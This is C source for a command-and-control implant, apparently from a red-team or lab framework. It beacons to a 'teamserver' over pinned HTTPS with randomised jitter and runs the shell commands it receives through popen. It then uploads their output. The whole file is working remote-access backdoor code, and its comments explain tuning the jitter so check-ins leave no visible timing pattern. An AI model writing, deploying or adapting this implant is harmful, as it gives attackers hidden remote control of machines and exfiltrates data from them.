#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "https_client.h"
#include "protocol.h"

#define DEFAULT_HOST "127.0.0.1"
#define DEFAULT_PORT 8443
#define DEFAULT_CA_FILE "certs/server.pem"

/* Mean milliseconds between check-ins, before jitter. */
#define POLL_BASE_MS 5000

/* How far each interval may deviate from the base, as a percentage. */
#define POLL_JITTER_PERCENT 40

/* Cap on the output uploaded for one command. */
#define OUTPUT_MAX 4096

struct target_config
{
  const char *host;
  int port;
  const char *ca_file;
};

static void print_usage(const char *program)
{
  fprintf(stderr,
          "usage: %s [--host HOST] [--port PORT] [--ca PEM]\n"
          "  --host  teamserver address (default %s)\n"
          "  --port  teamserver port (default %d)\n"
          "  --ca    certificate to pin (default %s)\n",
          program, DEFAULT_HOST, DEFAULT_PORT, DEFAULT_CA_FILE);
}

static int parse_port(const char *text, int *port)
{
  char *end = NULL;
  long value;

  value = strtol(text, &end, 10);
  if (end == text || end == NULL || *end != '\0' || value < 1 ||
      value > 65535)
  {
    return -1;
  }

  *port = (int)value;
  return 0;
}

/* Returns 0 to continue, 1 when help was printed, -1 on a bad argument. */
static int parse_args(int argc, char *argv[], struct target_config *target)
{
  int i;

  for (i = 1; i < argc; ++i)
  {
    const char *option = argv[i];

    if (strcmp(option, "--help") == 0 || strcmp(option, "-h") == 0)
    {
      print_usage(argv[0]);
      return 1;
    }
    if (i + 1 >= argc)
    {
      fprintf(stderr, "%s requires a value\n", option);
      return -1;
    }

    if (strcmp(option, "--host") == 0)
    {
      target->host = argv[++i];
    }
    else if (strcmp(option, "--ca") == 0)
    {
      target->ca_file = argv[++i];
    }
    else if (strcmp(option, "--port") == 0)
    {
      if (parse_port(argv[++i], &target->port) != 0)
      {
        fprintf(stderr, "invalid port: %s\n", argv[i]);
        return -1;
      }
    }
    else
    {
      fprintf(stderr, "unknown option: %s\n", option);
      return -1;
    }
  }
  return 0;
}

/* Sleep a randomised interval so check-ins do not land on an even beat.
   Resolution is milliseconds: whole-second jitter still produced a visible 3s
   pattern, because every short draw rounded to the same value. */
static void wait_interval(void)
{
  const long span_ms = (POLL_BASE_MS * POLL_JITTER_PERCENT) / 100;
  long total_ms = POLL_BASE_MS - span_ms + (rand() % (int)((2 * span_ms) + 1));
  struct timespec interval;

  if (total_ms < 1)
  {
    total_ms = 1;
  }
  interval.tv_sec = (time_t)(total_ms / 1000);
  interval.tv_nsec = (long)(total_ms % 1000) * 1000000L;
  (void)nanosleep(&interval, NULL);
}

/* Run 'command' locally and upload its output as a framed result. */
static void exec_task(const struct target_config *target, const char *command,
                      unsigned int command_len)
{
  char *cmd = (char *)malloc((size_t)command_len + 1);

  if (cmd == NULL)
  {
    fprintf(stderr, "allocation failed\n");
    return;
  }
  memcpy(cmd, command, command_len);
  cmd[command_len] = '\0';

  FILE *fp = popen(cmd, "r"); // NOLINT(bugprone-command-processor,clang-analyzer-optin.taint.GenericTaint)
  free(cmd);
  if (fp == NULL)
  {
    fprintf(stderr, "pipe failed\n");
    return;
  }

  char output[OUTPUT_MAX];
  size_t total_len = 0;

  // Read directly into the bounded response buffer to cap output size
  while (total_len < sizeof(output) - 1)
  {
    size_t bytes_read = fread(output + total_len, 1,
                              sizeof(output) - 1 - total_len, fp);
    if (bytes_read == 0)
    {
      break;
    }
    total_len += bytes_read;
  }
  pclose(fp);

  // One allocation so header and payload go out as a single body
  struct C2_HEADER response_header = {CHECK_IN_MAGIC, CMD_EXECUTE_SHELL, 0};
  response_header.payload_size = (uint32_t)total_len;

  size_t frame_len = sizeof(response_header) + total_len;
  char *frame = (char *)malloc(frame_len);
  if (frame == NULL)
  {
    fprintf(stderr, "allocation failed\n");
    return;
  }
  memcpy(frame, &response_header, sizeof(response_header));
  memcpy(frame + sizeof(response_header), output, total_len);

  char *reply = NULL;
  size_t reply_len = 0;
  int status = https_post(target->host, target->port, C2_PATH_RESULT,
                          frame, frame_len, target->ca_file, &reply,
                          &reply_len);

  free(frame);
  free(reply);

  if (status != 200)
  {
    fprintf(stderr, "upload failed (%d)\n", status);
  }
}

int main(int argc, char *argv[])
{
  struct target_config target = {DEFAULT_HOST, DEFAULT_PORT, DEFAULT_CA_FILE};
  int parsed = parse_args(argc, argv, &target);

  if (parsed != 0)
  {
    return parsed > 0 ? 0 : 2;
  }

  /* Seed once: without this every instance would produce the same sequence. */
  srand((unsigned int)time(NULL) ^ (unsigned int)getpid());

  for (;;)
  {
    /* A check-in carries no payload; the header alone is the request body. */
    struct C2_HEADER check_in = {CHECK_IN_MAGIC, CMD_CHECK_IN, 0};

    char *body = NULL;
    size_t body_len = 0;
    int status = https_post(target.host, target.port, C2_PATH_CHECKIN,
                            (const char *)&check_in, sizeof(check_in),
                            target.ca_file, &body, &body_len);

    if (status == 200 && body_len >= sizeof(struct C2_HEADER))
    {
      struct C2_HEADER incoming;

      memcpy(&incoming, body, sizeof(incoming));

      /* Reject a frame the server and implant disagree on the size of. */
      if (incoming.magic != CHECK_IN_MAGIC ||
          (size_t)incoming.payload_size + sizeof(incoming) != body_len)
      {
        fprintf(stderr, "bad response\n");
      }
      else if (incoming.command_id == CMD_EXIT)
      {
        free(body);
        break;
      }
      else if (incoming.command_id == CMD_EXECUTE_SHELL)
      {
        exec_task(&target, body + sizeof(incoming), incoming.payload_size);
      }
    }
    else if (status != 204)
    {
      /* 204 means the queue was empty; anything else is worth reporting. */
      fprintf(stderr, "request failed (%d)\n", status);
    }

    free(body);
    wait_interval();
  }

  return 0;
}
